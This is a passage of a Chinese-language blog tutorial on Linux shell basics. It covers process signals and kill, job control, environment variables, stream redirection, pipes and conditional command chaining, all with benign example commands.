-<p><strong>举例1：</strong><br>　　某个进程正在保存文件。这时候遭遇“它杀”可能会导致文件损坏。<br>　　（注：虽然某些操作系统能做到“写操作的原子性”，但数据存储可能会涉及多个写操作。当进程在作【多个】关键性写操作时，遭遇它杀。可能导致数据文件【逻辑上】的损坏）</p>
-<p><strong>举例2：</strong><br>　　还有更复杂的情况，比如涉及跨主机的网络通讯。某个进程可能向【远程】的某个网络服务分配了某个远程的资源，当进程“自然死亡 or 自杀”，它会在“善后工作”释放这个资源；而如果死于内核的“它杀”，这个远程的资源就【没】释放。</p>
-<h3 id="◇kill-VS-killall"><a href="#◇kill-VS-killall" class="headerlink" title="◇kill VS killall"></a>◇kill VS killall</h3><p>　　这两个的差别在于——前者用“进程号”，后者用”进程名“（也就是可执行文件名）。<br>　　对于新手而言，<br>如果用 <code>kill</code> 命令，你需要先用 <code>ps</code> 命令打印出当前进程清单，然后找到你要杀的进程的编号；而如果要用 <code>killall</code> 命令，就比较省事（比较傻瓜化）。但万一碰到有多个【同名】进程在运行，而你只想干掉其中一个，那么就得老老实实用 <code>kill</code> 了。</p>
-<h3 id="◇进程退出码"><a href="#◇进程退出码" class="headerlink" title="◇进程退出码"></a>◇进程退出码</h3><p>　　任何一个进程退出的时候，都对应某个【整数类型】的“退出码”。<br>　　按照 POSIX 系统（UNIX ＆ Linux）的传统惯例——<br>当“退出码”为【零】，表示“成功 or 正常状态”；<br>当“退出码”【非零】，表示“失败 or 异常状态”。</p>
-<h3 id="◇暂停进程"><a href="#◇暂停进程" class="headerlink" title="◇暂停进程"></a>◇暂停进程</h3><p>　　刚才聊“杀进程”的时候提到了“自杀 VS 它杀”。前者比较“温柔”；而后者比较“粗暴”。<br>　　对于暂停进程，也有“温柔 ＆ 野蛮”两种玩法。而且也是用 <code>kill</code> 命令发信号。</p>
-<p><strong>【温柔】式暂停（SIGTSTP）</strong></p>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">kill</span> -<span class="hljs-keyword">TSTP</span> 进程编号<br></code></pre></td></tr></table></figure>
-<p>　　这个【SIGTSTP】信号类似前面提及的【SIGINT】——<br>\1. 两者默认都绑定到组合键（【SIGINT】默认绑定到组合键【<code>Ctrl + C</code>】；【SIGTSTP】默认绑定到组合键【<code>Ctrl + Z</code>】）<br>\2. 这两个快捷键都是由【终端】截获，并发出相应的信号（具体原理参见本章节的某个小节）<br>\3. 两者都是【可】屏蔽的信号。也就是说，如果某个进程屏蔽了【SIGTSTP】信号，你就【无法】用该方式暂停它。这时候你就得改用【粗暴】的方式（如下）。</p>
-<p><strong>【粗暴】式暂停（SIGSTOP）</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -STOP 进程编号<br></code></pre></td></tr></table></figure>
-<p>　　这个【SIGSTOP】信号与前面提及的【SIGKILL】有某种相同之处——这两个信号都属于【不可屏蔽】的信号。也就是说，收到【SIGSTOP】信号的进程【无法】抗拒被暂停（suspend）的命运。</p>
-<p>　　与“杀进程”的风格类似——当你想要暂停某进程，应该先尝试“温柔”的方法，搞不定再用“粗暴”的方法（套用咱们天朝的老话叫“先礼后兵”）。</p>
-<h3 id="◇恢复进程"><a href="#◇恢复进程" class="headerlink" title="◇恢复进程"></a>◇恢复进程</h3><p>　　当你想要重新恢复（resume）被暂停的进程，就用如下命令（该命令发送信号【SIGCONT】）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -CONT 进程编号<br></code></pre></td></tr></table></figure>
-
-
-<h3 id="◇引申阅读"><a href="#◇引申阅读" class="headerlink" title="◇引申阅读"></a>◇引申阅读</h3><p>　　除了前面几个小节提到的信号，POSIX 系统还支持其它一些信号，具体参见维基百科的“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Signal_(IPC)">这个页面</a>”。</p>
-<h2 id="★作业控制（job）"><a href="#★作业控制（job）" class="headerlink" title="★作业控制（job）"></a>★作业控制（job）</h2><p>　　聊完了“进程控制”，再来聊“作业控制”。<br>　　（注：这里所说的“作业”是从洋文 job 翻译过来滴）</p>
-<h3 id="◇啥是“作业”？"><a href="#◇啥是“作业”？" class="headerlink" title="◇啥是“作业”？"></a>◇啥是“作业”？</h3><p>　　“作业”是 shell 相关的术语，用来表示【进程组】的概念（每个作业就是一组进程）。<br>　　比如说，当你用“管道符”把若干命令串起来执行，这几个命令对应的进程就被视作【一组】。<br>　　（注：“管道符”的用法，后面某个章节会介绍）</p>
-<h3 id="◇同步执行（前台执行）-VS-异步执行（后台执行）"><a href="#◇同步执行（前台执行）-VS-异步执行（后台执行）" class="headerlink" title="◇同步执行（前台执行） VS 异步执行（后台执行）"></a>◇同步执行（前台执行） VS 异步执行（后台执行）</h3><p>　　大部分情况下，你在 shell 中执行的命令都是“同步执行”（或者叫“前台执行”）。对于这种方式，只有当命令运行完毕，你才会重新看到 shell 的“命令行提示符”。<br>　　如果你以“异步执行”的方式启动某个外部命令，在这个命令还没有执行完的时候，你就可以重新看到“命令行提示符”。</p>
-<p>　　请注意：<br>　　对于【短】寿命的外部命令（耗时很短的外部命令），“同步/异步”两种方式其实【没】啥区别。比如 <code>ls</code> 命令通常很快就执行完毕，你就感觉不到上述两种方式的差异。<br>　　只有当你执行了某个【长】寿命的外部命令（其执行时间至少达到若干秒），上述这两种方式才会体现出差别。</p>
-<p>　　到目前为止，本文之前聊的命令执行方式，都属于“同步执行”；如果想用【异步】，需要在整个命令的最末尾追加一个半角的 <code>&amp;</code> 符号。</p>
-<p><strong>【同步】方式举例</strong><br>　　下列命令以【同步】的方式启动火狐浏览器，只有当你关闭了火狐，才会重新看到 shell 的命令行提示符。</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">firefox</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>【异步】方式举例</strong><br>　　下列命令以【异步】的方式启动火狐浏览器。你刚敲完回车，就会重新看到 shell 的“命令行提示符”（此时火狐依然在运行）</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">firefox <span class="hljs-meta">&amp;</span><br></code></pre></td></tr></table></figure>
-
-<p>　　以“同步”方式启动的进程，称作“【前台】进程”；反之，以“异步”方式启动的进程，称作“【后台】进程”。</p>
-<h3 id="◇“前台”切换到“后台”"><a href="#◇“前台”切换到“后台”" class="headerlink" title="◇“前台”切换到“后台”"></a>◇“前台”切换到“后台”</h3><p>　　假设当前的 shell 正在执行某个长寿命的【前台】进程，你可以按【<code>Ctrl + Z</code>】，就可以让该进程变为【后台】进程——此时你立即可以看到“命令提示符”。<br>　　只要你不是太健忘，应该记得前一个章节有提到过【<code>Ctrl + Z</code>】这个组合键——它用来实现”【温柔】式暂停“，其原理是：向目标进程发送【SIGTSTP】信号。</p>
-<h3 id="◇“后台”切换到“前台”"><a href="#◇“后台”切换到“前台”" class="headerlink" title="◇“后台”切换到“前台”"></a>◇“后台”切换到“前台”</h3><p>　　假设当前 shell 正在执行某个后台进程。由于该进程在【后台】执行，此时有“命令提示符”，然后你在 shell 中执行 <code>fg</code> 命令，就可以把该后台进程切换到【前台】。</p>
-<p>　　某些爱思考的同学会问了——如果同时启动了【多个】“后台进程”，<code>fg</code> 命令会切换哪一个捏？<br>　　在这种情况下，<code>fg</code> 命令切换的是【最后启动】的那个。</p>
-<p>　　如果你有 N 个“后台进程”，你想把其中的某个切换为“前台进程”，这时候就需要用到 <code>jobs</code> 命令。该命令与乔布斯同名 :)<br>　　举例：<br>　　假设俺同时启动了 vim 与 emacs 作为后台进程，先用 <code>jobs</code> 命令列出所有的后台进程。假设该命令的输出是如下这个样子。</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$ jobs<br><span class="hljs-string">[1]</span>  running    vim<br><span class="hljs-string">[2]</span>  running    emacs<br></code></pre></td></tr></table></figure>
-<p>　　在上述的终端窗口，中括号里面的数字称作“job id”。你可以用 <code>fg</code> 命令搭配“job id”，把某个后台进程切换到前台。<br>　　（在本例中）如果你想切换 emacs 到前台，就运行 <code>fg %2</code>，如果想切换 vim 就运行 <code>fg %1</code>（以此类推）</p>
-<h3 id="◇引申阅读-1"><a href="#◇引申阅读-1" class="headerlink" title="◇引申阅读"></a>◇引申阅读</h3><p>　　想进一步了解“作业控制”，可以参考维基百科（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Job_control_(Unix)">这个链接</a>）。</p>
-<h2 id="★环境变量（environment-variable）"><a href="#★环境变量（environment-variable）" class="headerlink" title="★环境变量（environment variable）"></a>★环境变量（environment variable）</h2><h3 id="◇“环境变量”是啥？"><a href="#◇“环境变量”是啥？" class="headerlink" title="◇“环境变量”是啥？"></a>◇“环境变量”是啥？</h3><p>　　所谓的“环境变量”，你可以通俗理解为某种【名值对】——每个“环境变量”都有自己的【名称】和【值】。并且名称必须是【唯一】滴。</p>
-<h3 id="◇如何添加并修改“环境变量”？"><a href="#◇如何添加并修改“环境变量”？" class="headerlink" title="◇如何添加并修改“环境变量”？"></a>◇如何添加并修改“环境变量”？</h3><p>　　在 bash（或兼容 bash 的其它 shell），你可以用 <code>export</code> 设置环境变量。比如下面这个命令行设置了一个“环境变量”，其名称是 <code>abc</code>，其值是 <code>xyz</code></p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">abc</span>=xyz<br></code></pre></td></tr></table></figure>
-
-<p>　　假如你要设置的【值】包含空格，记得用双引号引用该值（示例如下）。</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">abc</span>=<span class="hljs-string">&quot;program think&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>　　由于“环境变量”的名称具有【唯一性】，当你设置【同名】的“环境变量”就等同于对它的【修改】。</p>
-<h3 id="◇如何查看“环境变量”？"><a href="#◇如何查看“环境变量”？" class="headerlink" title="◇如何查看“环境变量”？"></a>◇如何查看“环境变量”？</h3><p>　　设置完之后，你可以用 <code>env</code> 命令查看。该命令会列出【当前 shell】中的【全部】“环境变量”。</p>
-<h3 id="◇“环境变量”的【可见性】和【可继承性】"><a href="#◇“环境变量”的【可见性】和【可继承性】" class="headerlink" title="◇“环境变量”的【可见性】和【可继承性】"></a>◇“环境变量”的【可见性】和【可继承性】</h3><p>　　某个进程设置的“环境变量”，其【可见性】仅限于该进程及其子进程（也就是“进程树”中，该进程所在的那个枝节）。<br>　　基于上述的【可见性】原则，你在某个 shell 中设置的“环境变量”，只在“该 shell 进程本身”，以及通过该 shell 进程启动的“其它子进程”，才能看到。</p>
-<p>　　另外，如果系统关机，所有进程都会退出，那么你采用上一个小节（export 方式）设置的“环境变量”也就随之消失了。<br>　　为了让某个“环境变量”永久生效，需要把相应的 <code>export</code> 命令添加到该 shell 的初始化配置文件中。对于 bash 而言，也就是 <code>~/.bashrc</code> 或者 <code>~/.profile</code><br>　　估计有些同学会问：上述这两个初始化配置文件，有啥差别捏？<br>　　俺如果有空，会单独写一篇关于 bash 的定制教程，到时候再聊这个话题。</p>
-<h3 id="◇“环境变量”有啥用？"><a href="#◇“环境变量”有啥用？" class="headerlink" title="◇“环境变量”有啥用？"></a>◇“环境变量”有啥用？</h3><p>　　通俗地说，“环境变量”是某种比较简单的“IPC 机制”（进程通讯机制），可以让两个进程共享某个简单的文本信息。<br>　　举例：<br>　　很多知名的软件（比如：curl、emacs）都支持“以环境变量设置代理”。<br>　　如果你按照它的约定，在 shell 中设置了约定名称和格式的“环境变量”，然后在【同一个】shell 中启动这个软件，（由于环境变量的【可继承性】）该软件就会看到这个“环境变量”，并根据“环境变量”包含的信息，设置代理。</p>
-<h2 id="★“标准流”（standard-stream）与“重定向”（redirection）"><a href="#★“标准流”（standard-stream）与“重定向”（redirection）" class="headerlink" title="★“标准流”（standard stream）与“重定向”（redirection）"></a>★“标准流”（standard stream）与“重定向”（redirection）</h2><h3 id="◇进程的3个“标准流”"><a href="#◇进程的3个“标准流”" class="headerlink" title="◇进程的3个“标准流”"></a>◇进程的3个“标准流”</h3><p>　　在 POSIX 系统（Linux ＆ UNIX）中，每个进程都内置了三个“标准流”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Standard_streams">standard stream</a>），分别称作：“标准输入流”（stdin），“标准输出流”（stdout），“标准错误输出流”（stderr）。<br>　　当进程启动后，在默认情况下，stdin 对接到终端的【输入】；stdout ＆ stderr 对接到终端的【输出】。示意图如下：</p>
-<p><img src="https://lh4.googleusercontent.com/JEfAB2UXDSRwczojJZOXEDAK5xH4E6YdksxZuIqq_5Tfe6xjwHrbeYX5EETlsHxQYk1Wm_wXg-ajpjIu3lHzYLeYJML5xxQQgsuhnZodUcC5jbtdLQ7_AflDdUkEfAthqHqBly3CQPo" alt="不见图 请翻墙"><br>（三个【标准流】的示意图）</p>
-<p>　　如果你是程序员，俺补充一下：<br>　　当你在程序中打开某个文件，会得到一个“文件描述符”（洋文叫“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/File_descriptor">file descriptor</a>”，简称 fd）。fd 本身是个整数，程序员可以通过 fd 对该文件进行读写。<br>　　而进程的三个【标准流】，就相当于是三个特殊的 fd。当进程启动时，操作系统就已经把这三个 fd 准备好了。<br>　　由于这三个玩意儿是预先备好滴，所以它们的数值分别是：0、1、2（参见上图中 # 后面的数字）。</p>
-<h3 id="◇演示“标准流”的实际效果"><a href="#◇演示“标准流”的实际效果" class="headerlink" title="◇演示“标准流”的实际效果"></a>◇演示“标准流”的实际效果</h3><p>　　在本文前面的某个章节，俺已经用 gif 动画演示了终端的“行模式”。<br>　　动画中的 <code>cat</code> 命令同样可以用来演示“标准输入输出”。俺把那个动画再贴一次。</p>
-<p><img src="https://lh5.googleusercontent.com/PPet_RllllnSmYALmxV56ohy5NZz1kj76GzbmcvM9HJDrqY6h74otCFL1E0rG_lEKnALViM8zv2E4BOj4bUUTixzD_QTTXsmoh0-U3dxJROpiAfvW2vHZ69s2vpYlq88-6FBngqgzSQ" alt="不见图 请翻墙"><br>（动画：“标准输入输出”的效果）</p>
-<p>　　请注意，第1行 <code>test</code> 是针对 <code>cat</code> 进程的【输入】，对应于【stdin】（你之所以能看到这行，是因为前面所说的【终端回显】）<br>　　第2行 <code>test</code> 是 <code>cat</code> 进程拿到输入文本之后的原样输出，对应于【stdout】。</p>
-<h3 id="◇“标准流”的【重定向】"><a href="#◇“标准流”的【重定向】" class="headerlink" title="◇“标准流”的【重定向】"></a>◇“标准流”的【<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Redirection_(computing)">重定向</a>】</h3><p>　　所谓的【重定向】大体上分两种：</p>
-<p><strong>1. 【输入流】重定向</strong><br>　　把某个文件重定向为 stdin；此时进程通过 stdin 读取的是该文件的内容。<br>　　这种玩法使用小于号（<code>&lt;</code>）</p>
-<p><strong>2. 【输出流】重定向</strong><br>　　把 stdout 重定向到某个文件；此时进程写入 stdout 的内容会【覆盖 or 追加】到这个文件。<br>　　这种玩法使用【单个】大于号（<code>&gt;</code>）或【两个】大于号（<code>&gt;&gt;</code>）。前者用于【覆盖】文件内容，后者用于【追加】文件内容。</p>
-<p>　　另外，有时候你会看到 <code>2&gt;&amp;1</code> 这种写法。它表示：把 stderr 合并到 stdout。<br>　　（注：前面俺提到过——stdout 是“数值为 1 的文件描述符”；stderr 是“数值为 2 的文件描述符”）</p>
-<h3 id="◇【重定向】举例"><a href="#◇【重定向】举例" class="headerlink" title="◇【重定向】举例"></a>◇【重定向】举例</h3><p><strong>cat 的例子</strong><br>　　下面这个命令把某个文件重定向到 <code>cat</code> 的 stdin。</p>
-<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> &lt; 文件名<br></code></pre></td></tr></table></figure>
-
-<p>　　很多菜鸟容易把上面的命令与下面的命令搞混淆。<br>　　请注意：上面的命令用的是【输入重定向】，而下面的命令用的是【命令行参数】。</p>
-<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> 文件名<br></code></pre></td></tr></table></figure>
-
-<p><code>cat</code> 命令还可以起到类似“文件复制”的效果。<br>　　比如你已经有个 <code>文件1</code>，用下面这种玩法，会创建出一个内容完全相同的 <code>文件2</code>。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> &lt; 文件<span class="hljs-number">1</span> &gt; 文件<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
-<p>　　某些同学可能会问了：既然能这么玩，为啥还需要用 <code>cp</code> 命令进行文件复制捏？<br>　　原因在于：<code>cat</code> 的玩法，只保证内容一样，其它的不管；而 <code>cp</code> 除了复制文件内容，还会确保“目标文件”与“源文件”具有相同的属性（比如 mode）。</p>
-<p><strong>更多的例子</strong><br>　　在之前那篇《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html">扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</a>》，里面介绍了十多种 nc 的玩法。很多都用到了【重定向】。</p>
-<h2 id="★匿名管道（anonymous-pipe）"><a href="#★匿名管道（anonymous-pipe）" class="headerlink" title="★匿名管道（anonymous pipe）"></a>★匿名管道（anonymous pipe）</h2><h3 id="◇“匿名管道”的【原理】"><a href="#◇“匿名管道”的【原理】" class="headerlink" title="◇“匿名管道”的【原理】"></a>◇“匿名管道”的【原理】</h3><p>　　在大部分 shell 中，使用竖线符号（<code>|</code>）来表示【管道符】。用它来创建一个【<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Anonymous_pipe">匿名管道</a>】，使得前一个命令（进程）的“标准输出”关联到后一个命令（进程）的“标准输入”。</p>
-<h3 id="◇举例"><a href="#◇举例" class="headerlink" title="◇举例"></a>◇举例</h3><p>　　俺曾经在“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2013/01/cross-host-use-gfw-tool.html">这篇博文</a>”中介绍过——如何用 <code>netstat</code> 查看当前系统的监听端口。<br>　　对于 Windows 系统，可以用如下命令：</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netstat -an | <span class="hljs-builtin-name">find</span> <span class="hljs-string">&quot;LISTEN&quot;</span><br></code></pre></td></tr></table></figure>
-<p>　　对于 POSIX 系统，可以用如下命令：</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -an <span class="hljs-string">| grep &quot;</span>LISTEN<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>　　在上述两个例子中，都用到了【管道符】。因为 <code>netstat -an</code> 这个命令的输出可能会很多，先把它的输出通过【匿名管道】丢给某个专门负责过滤的命令（比如：POSIX 的 grep 或 Windows 的find）。当这个过滤命令拿到 <code>netstat</code> 的输出内容，再根据你在命令行参数中指定的【关键字】（也就是上述例子中的 <code>LISTEN</code>），过滤出包含【关键字】的那些【行】。<br>　　最终，你看到的是“过滤命令”（grep 或 find）的输出。</p>
-<h3 id="◇【串联的】匿名管道（chained-pipeline）"><a href="#◇【串联的】匿名管道（chained-pipeline）" class="headerlink" title="◇【串联的】匿名管道（chained pipeline）"></a>◇【串联的】匿名管道（chained pipeline）</h3><p>　　前面的例子，可以用来列出当前系统中所有的监听端口。<br>　　现在，假设你运行了 Tor Browser，然后想看看它到底有没有开启 <code>9150</code> 这个监听端口，那么你就可以在上述命令中进行【二次过滤】（具体命令大致如下）。这就是所谓的【串联】。</p>
-<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">netstat -an | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;LISTEN&quot;</span> | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;9150&quot;</span><br></code></pre></td></tr></table></figure>
-
-
-<h3 id="◇“匿名管道”与“作业”（进程组）"><a href="#◇“匿名管道”与“作业”（进程组）" class="headerlink" title="◇“匿名管道”与“作业”（进程组）"></a>◇“匿名管道”与“作业”（进程组）</h3><p>　　用“匿名管道”串起来的多个进程，构成一个“作业”（这点前面提到了）。<br>　　你可以尝试执行某个长寿命的，带管道符的命令行，然后用 <code>Ctrl + Z</code> 切到后台，再执行 <code>jobs</code> 看一下，就能看出——该命令行对应的【多个】进程属于同一个 job。</p>
-<h2 id="★批处理（batch）"><a href="#★批处理（batch）" class="headerlink" title="★批处理（batch）"></a>★批处理（batch）</h2><h3 id="◇啥是“批处理”？"><a href="#◇啥是“批处理”？" class="headerlink" title="◇啥是“批处理”？"></a>◇啥是“批处理”？</h3><p>　　通俗地说就是：同时执行多个命令。<br>　　为了支持“批处理”，shell 需要提供若干语法规则。而且不同类型的 shell，用来搞“批处理”的语法规则也存在差异。<br>　　在本章节中，俺以 bash 来举例。</p>
-<h3 id="◇【无】条件的“批处理”"><a href="#◇【无】条件的“批处理”" class="headerlink" title="◇【无】条件的“批处理”"></a>◇【无】条件的“批处理”</h3><p>　　如果你把多个命令写在同一行，并且命令之间用半角分号隔开，这种玩法就属于【无条件】的批处理执行。<br>　　举例：<br>　　假设当前目录下有一个 <code>abc.txt</code> 文件，然后要在当前目录下创建一个名为 <code>xxx</code> 的子目录，并把 <code>abc.txt</code> 移动到这个新创建的子目录中。你可以用如下方式搞定（只用【一行】命令）</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir .<span class="hljs-regexp">/xxx/</span>; mv abc.txt .<span class="hljs-regexp">/xxx/</span><br></code></pre></td></tr></table></figure>
-
-<p>　　为啥这种方式叫做“【无条件】批处理”捏？因为不管前一个“子命令”是否成功，都会继续执行下一个“子命令”。</p>
-<p>　　请注意：<br>　　虽然俺上述举例只使用了两个“子命令”，但实际上这种玩法可以把 N 个“子命令”串起来。</p>
-<h3 id="◇【有】条件的“批处理”"><a href="#◇【有】条件的“批处理”" class="headerlink" title="◇【有】条件的“批处理”"></a>◇【有】条件的“批处理”</h3><p>　　与“无条件”相对应的，当然是“有条件”啦。<br>　　这种玩法的意思是——后一个“子命令”是否执行，取决于【前一个】“子命令”的结果（成功 or 失败）。<br>　　（注：如何界定“成功/失败”，请参见前面某个章节聊到的【进程退出码】）<br>　　【有】条件的批处理，常见的方式有两种，分别是【逻辑与】、【逻辑或】。</p>
-<p><strong>逻辑与（语法：<code>&amp;&amp;</code>）</strong><br>　　只要前面的某个“子命令”【失败】了，就【不再】执行后续的“子命令”。<br>　　举例：<br>　　还是拿前一个小节的例子。如下方式使用了“逻辑与”。如果创建子目录失败，就【不再】执行“移动文件”的操作</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir .<span class="hljs-regexp">/xxx/</span> &amp;&amp; mv abc.txt .<span class="hljs-regexp">/xxx/</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>逻辑或（语法：<code>||</code>）</strong><br>　　只要前面的某个“子命令”【成功】了，就【不再】执行后续的“子命令”。<br>　　举例：<br>　　把上述例子进一步扩充，变为如下：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir .<span class="hljs-regexp">/xxx/</span> &amp;&amp; mv abc.txt .<span class="hljs-regexp">/xxx/</span> || echo <span class="hljs-string">&quot;FAILED!!!&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>　　这个有点复杂，俺稍微解释一下：<br>　　你把前面两句看作一个【整体】。其执行的逻辑参见前面所说的“逻辑与”。然后这个“整体”与后面的那句 <code>echo</code> 再组合成【逻辑或】的关系。<br>　　也就是说，如果前面的“整体”成功了，那么就【不】执行 <code>echo</code>（【不】打印错误信息）；反之，如果前面的“整体”失败了，就会打印错误信息。</p>
-<h2 id="★shell-脚本"><a href="#★shell-脚本" class="headerlink" title="★shell 脚本"></a>★shell 脚本</h2><p>　　虽然前一个章节拿 bash 来举例。但其实有很多其它类型的 shell 都支持类似的“批处理”机制。<br>　　只要某个 shell 支持刚才所说的【有条件批处理】的机制，它就已经很接近【编程语言】了。<br>　　于是很自然地，那些 shell 的作者就会把 shell 逐步发展成某种【脚本语言】的解释器。然后就有了如今的“shell script”（shell 脚本）和“shell 编程”。<br>　　由于“shell 编程”这个话题比较大。哪怕俺只聊 bash 这一类 shell 的编程，也足够写上几万字的博文。考虑到本文已经很长了，这个话题就不再展开。<br>　　对此感兴趣的同学，可以参考俺分享的电子书。具体参见<a target="_blank" rel="noopener" href="https://github.com/programthink/books">电子书清单</a>的如下几本（这几本都位于【IT类 / 操作系统 / 使用教程】分类目录下）<br>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1Zw8XD56F6rCi899UxIE-0sKoXWr2WGqiUNcRl70kIYk/">Shell 脚本学习指南</a>》（Classic Shell Scripting）<br>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1Nk83xAbRUdcgqUBSfDCwozA3-EUFeBz-nrpf1G7x-j0/">Linux 与 UNIX Shell 编程指南</a>》（Linux and UNIX Shell Programming）<br>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1BYSgrSViVZyDTQcuhWEFAc_uc0YZvkIoQYLmv0yWo_A/">高级 Bash 脚本编程指南</a>》（Advanced Bash-Scripting Guide）</p>
-<h2 id="★结尾"><a href="#★结尾" class="headerlink" title="★结尾"></a>★结尾</h2><p>　　由于这篇涉及的内容比较杂，跨度也比较大。可能会有一些俺没覆盖到的地方。欢迎在博客留言中补充。<br>　　如果你发现本文的错误之处，也欢迎批评指正 :)</p>
-</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/images/you.jpg" alt="胡雅宁"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">胡雅宁</p><p class="is-size-6 is-block">虽千万人吾往矣</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">61</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">9</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">37</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1905060202" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/1905060202"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.zhihu.com/people/little-ning-ge" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">知乎</span></span><span class="level-right"><span class="level-item tag">www.zhihu.com</span></span></a></li><li><a class="level is-mobile" href="https://space.bilibili.com/24140963" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">bilibili</span></span><span class="level-right"><span class="level-item tag">space.bilibili.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"><span class="level-start"><span class="level-item">人工智能</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"><span class="level-start"><span class="level-item">数据分析</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"><span class="level-start"><span class="level-item">经验分享</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"><span class="level-start"><span class="level-item">编程语言</span></span><span class="level-end"><span class="level-item 